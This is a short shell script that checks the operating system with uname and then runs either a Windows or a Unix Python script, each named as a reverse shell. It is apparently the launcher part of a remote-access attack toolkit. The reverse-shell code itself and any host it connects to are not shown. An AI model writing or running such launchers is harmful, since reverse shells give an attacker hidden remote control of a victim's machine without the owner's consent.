systemName="$(uname -a | awk '{print tolower($0)}')"
case "$systemName" in
    cygwin*|mingw*) python reverseshell_windows.py;;
    *) python reverseshell_unix.py;;
esac
